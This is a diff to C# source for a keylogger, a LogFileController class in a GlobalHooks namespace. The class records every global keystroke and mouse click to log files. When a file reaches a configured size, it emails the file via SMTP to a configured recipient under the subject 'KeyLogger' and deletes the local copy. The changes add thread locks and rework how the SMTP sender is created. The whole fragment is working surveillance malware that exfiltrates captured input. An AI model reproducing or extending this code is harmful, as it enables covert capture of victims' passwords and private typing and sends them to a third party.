@@ -8,38 +8,49 @@ namespace GlobalHooks
         private const string MouseLogFilePath = @"mouse.log";
         private const string KeyboardLogFilePath = @"keyboard.log";
         private readonly ConfigurationInfo _configuration;
-        private readonly SmtpController _smtpController;
+        private readonly object _mouseLock = new object();
+        private readonly object _keyboardLock = new object();
 
         public LogFileController(ConfigurationInfo configuration)
         {
             _configuration = configuration;
-            _smtpController = new SmtpController(_configuration);
         }
 
-        public void LogMouseClick(string key, string position)
+        public void LogMouseClick(object param)
         {
-            using (var writer = new StreamWriter(MouseLogFilePath, true))
+            var paramArray = ((string)param).Split(' ');
+            lock (_mouseLock)
             {
-                writer.WriteLine($"{DateTime.Now} : Key: {key}, Position: {position}");
+                using (var writer = new StreamWriter(MouseLogFilePath, true))
+                {
+                    writer.WriteLine($"{DateTime.Now} : Key: {paramArray[0]}, Position: {paramArray[1]}");
+                    writer.Dispose();
+                }
+                SendLog(MouseLogFilePath);
             }
-            SendLog(MouseLogFilePath);
         }
 
-        public void LogKeyDown(string key)
+        public void LogKeyDown(object key)
         {
-            using (var writer = new StreamWriter(KeyboardLogFilePath, true))
+            lock (_keyboardLock)
             {
-                writer.WriteLine($"{DateTime.Now} : Key: {key}");
+                using (var writer = new StreamWriter(KeyboardLogFilePath, true))
+                {
+                    writer.WriteLine($"{DateTime.Now} : Key: {(string)key}");
+                    writer.Dispose();
+                }
+                SendLog(KeyboardLogFilePath);
             }
-            SendLog(KeyboardLogFilePath);
         }
 
         private void SendLog(string logFilePath)
         {
             if (string.IsNullOrEmpty(_configuration.To) || string.IsNullOrEmpty(_configuration.From) ||
                 string.IsNullOrEmpty(_configuration.Password)) return;
-            if(new FileInfo(logFilePath).Length<_configuration.FileSize) return;
-            _smtpController.Send(@"KeyLogger", logFilePath);
+            if (new FileInfo(logFilePath).Length < _configuration.FileSize) return;
+            new SmtpController(_configuration.From, _configuration.Password).Send(@"KeyLogger", logFilePath,
+                _configuration.To);
+            new FileInfo(logFilePath).Delete();
         }
     }
 }
